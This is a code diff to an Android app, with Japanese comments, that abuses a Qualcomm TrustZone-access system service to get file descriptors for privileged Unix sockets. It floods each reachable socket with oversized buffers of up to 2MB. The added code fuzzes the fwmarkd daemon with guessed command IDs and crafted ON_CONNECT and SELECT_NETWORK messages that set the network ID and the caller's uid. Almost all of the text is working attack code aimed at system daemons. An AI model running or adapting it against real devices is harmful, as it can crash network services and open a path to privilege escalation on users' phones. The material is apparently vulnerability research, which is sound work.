@@ -45,6 +45,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String TARGET_PKG_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess";
     private static final String TARGET_CLS_TZ = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";
     private static final String PROPERTY_SERVICE_PATH = "/dev/socket/property_service";
+    private static final String FWMARKD_SOCKET_PATH = "/dev/socket/fwmarkd";
 
     private TextView tvStatus, tvLog;
     private Button btnStart, btnStop;
@@ -172,7 +173,7 @@ public class MainActivity extends AppCompatActivity {
         String[] allSockets = {
             "/dev/socket/mdnsd",
             "/dev/socket/tcm",
-            "/dev/socket/fwmarkd",
+            FWMARKD_SOCKET_PATH,
             "/dev/socket/dnsproxyd",
             "/dev/socket/logd",
             PROPERTY_SERVICE_PATH,
@@ -228,17 +229,23 @@ public class MainActivity extends AppCompatActivity {
             appendLog("========== Interacting with successful sockets ==========");
             for (String s : successSockets) {
                 if (stopRequested.get()) break;
-                if (s.equals(PROPERTY_SERVICE_PATH)) continue;
+                if (s.equals(PROPERTY_SERVICE_PATH) || s.equals(FWMARKD_SOCKET_PATH)) continue;
                 interactWithSocket(s);
             }
         }
 
-        // バッファオーバーフロー試験：成功した全ソケットに対して実施
+        // 全ソケットへのバッファオーバーフロー試験（最大 2MB）
         if (!successSockets.isEmpty()) {
             appendLog("========== Buffer Overflow Test on ALL Sockets via JNI ==========");
             testBufferOverflowAllSockets();
         } else {
             appendLog("========== No successful sockets, skipping overflow test ==========");
+        }
+
+        // fwmarkd 専用プロトコル試験
+        if (successSockets.contains(FWMARKD_SOCKET_PATH)) {
+            appendLog("========== Fwmarkd Protocol Fuzzing Test ==========");
+            testFwmarkdProtocol();
         }
 
         appendLog("========== ALL TESTS COMPLETED ==========");
@@ -417,11 +424,9 @@ public class MainActivity extends AppCompatActivity {
         saveLog();
     }
 
-    // バッファオーバーフロー試験：全成功ソケットに対して実行
+    // ===== バッファオーバーフロー試験（全成功ソケット） =====
     private void testBufferOverflowAllSockets() {
-        // 試験するサイズ（バイト）を段階的に増やす
         int[] sizes = {1024 * 10, 1024 * 100, 1024 * 512, 1024 * 1024, 1024 * 1024 * 2};
-        // パターン文字列 "hellooo"
         byte[] pattern = "hellooo".getBytes(StandardCharsets.UTF_8);
 
         for (String path : successSockets) {
@@ -446,7 +451,6 @@ public class MainActivity extends AppCompatActivity {
                     }
                     int written = nativeSendLongData(pfd, payload, payload.length);
                     appendLog("[BOF] JNI write returned: " + written + " for size " + size);
-                    // 少し待ってから次のサイズへ
                     try { Thread.sleep(100); } catch (InterruptedException ignored) {}
                 }
             } catch (Exception e) {
@@ -454,8 +458,117 @@ public class MainActivity extends AppCompatActivity {
             } finally {
                 if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
             }
-            // 各ソケットの試験後に少し待機
             try { Thread.sleep(500); } catch (InterruptedException ignored) {}
+        }
+    }
+
+    // ===== fwmarkd プロトコルファジング試験 =====
+    private void testFwmarkdProtocol() {
+        appendLog("[FW] Starting fwmarkd protocol fuzzing test");
+
+        // コマンドID候補（実際の enum 値は不明だが、0-20 をカバー）
+        int[] cmdIds = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,20,30,50,100,200,255};
+
+        // 基本構造：16 バイト（cmdId + 12バイトパディング）
+        for (int cmdId : cmdIds) {
+            if (stopRequested.get()) break;
+            ByteArrayOutputStream baos = new ByteArrayOutputStream();
+            // cmdId (little endian)
+            baos.write(cmdId & 0xFF);
+            baos.write((cmdId >> 8) & 0xFF);
+            baos.write((cmdId >> 16) & 0xFF);
+            baos.write((cmdId >> 24) & 0xFF);
+            // 12バイトゼロ（uid, netId, trafficCtrlInfo など）
+            for (int i = 0; i < 12; i++) baos.write(0);
+            byte[] data = baos.toByteArray();
+            int result = sendFwmarkCommand(data);
+            appendLog("[FW] cmdId=" + cmdId + " -> result=" + result);
+        }
+
+        // ON_CONNECT を想定 (cmdId=1) + connectInfo (sockaddr_storage 128バイト)
+        ByteArrayOutputStream baos2 = new ByteArrayOutputStream();
+        baos2.write(1 & 0xFF); baos2.write((1 >> 8) & 0xFF); baos2.write((1 >> 16) & 0xFF); baos2.write((1 >> 24) & 0xFF);
+        for (int i = 0; i < 12; i++) baos2.write(0);
+        // connectInfo: 128バイトのダミー
+        byte[] dummyAddr = new byte[128];
+        // 適当に IP アドレスっぽいものを設定 (sin_family=AF_INET=2, port=80, address=127.0.0.1)
+        dummyAddr[0] = 2; // AF_INET
+        dummyAddr[2] = 0x50; // port 80 (big endian)
+        dummyAddr[3] = 0;
+        dummyAddr[4] = 127;
+        dummyAddr[5] = 0;
+        dummyAddr[6] = 0;
+        dummyAddr[7] = 1;
+        baos2.write(dummyAddr);
+        byte[] data2 = baos2.toByteArray();
+        int result2 = sendFwmarkCommand(data2);
+        appendLog("[FW] ON_CONNECT with connectInfo -> result=" + result2);
+
+        // SELECT_NETWORK (cmdId=6) を想定し、netId=1, uid=自身のuidを設定
+        ByteArrayOutputStream baos3 = new ByteArrayOutputStream();
+        baos3.write(6 & 0xFF); baos3.write((6 >> 8) & 0xFF); baos3.write((6 >> 16) & 0xFF); baos3.write((6 >> 24) & 0xFF);
+        int myUid = android.os.Process.myUid();
+        // uid (little endian)
+        baos3.write(myUid & 0xFF); baos3.write((myUid >> 8) & 0xFF); baos3.write((myUid >> 16) & 0xFF); baos3.write((myUid >> 24) & 0xFF);
+        // netId=1 (4 bytes)
+        baos3.write(1 & 0xFF); baos3.write(0); baos3.write(0); baos3.write(0);
+        // trafficCtrlInfo=0 (4 bytes)
+        for (int i = 0; i < 4; i++) baos3.write(0);
+        byte[] data3 = baos3.toByteArray();
+        int result3 = sendFwmarkCommand(data3);
+        appendLog("[FW] SELECT_NETWORK (netId=1) -> result=" + result3);
+
+        // 超大データ（1KB）を送信してエラーハンドリングを確認
+        byte[] bigData = new byte[1024];
+        for (int i = 0; i < bigData.length; i++) bigData[i] = (byte) (i & 0xFF);
+        int result4 = sendFwmarkCommand(bigData);
+        appendLog("[FW] 1KB random data -> result=" + result4);
+
+        // 長さが中途半端なデータ（例えば 20 バイト）を送信
+        byte[] midData = new byte[20];
+        for (int i = 0; i < midData.length; i++) midData[i] = (byte) (i & 0xFF);
+        int result5 = sendFwmarkCommand(midData);
+        appendLog("[FW] 20-byte data -> result=" + result5);
+
+        appendLog("[FW] fwmarkd protocol fuzzing completed");
+    }
+
+    // fwmarkd にコマンドを送信し、応答（int）を返す
+    private int sendFwmarkCommand(byte[] data) {
+        ParcelFileDescriptor pfd = null;
+        try {
+            int[] iArr = new int[1];
+            pfd = mTZService.a(FWMARKD_SOCKET_PATH, iArr);
+            if (pfd == null) {
+                appendLog("[FW] Failed to get FD");
+                return -1;
+            }
+            java.io.FileDescriptor fd = pfd.getFileDescriptor();
+            if (fd == null || !fd.valid()) {
+                appendLog("[FW] Invalid FD");
+                return -2;
+            }
+            OutputStream os = new FileOutputStream(fd);
+            os.write(data);
+            os.flush();
+
+            InputStream is = new FileInputStream(fd);
+            byte[] buf = new byte[4];
+            int read = is.read(buf);
+            if (read == 4) {
+
+                return (buf[0] & 0xFF) |
+                       ((buf[1] & 0xFF) << 8) |
+                       ((buf[2] & 0xFF) << 16) |
+                       ((buf[3] & 0xFF) << 24);
+            } else {
+                return -3;
+            }
+        } catch (Exception e) {
+            appendLog("[FW] Exception: " + e.getMessage());
+            return -4;
+        } finally {
+            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
         }
     }
 }
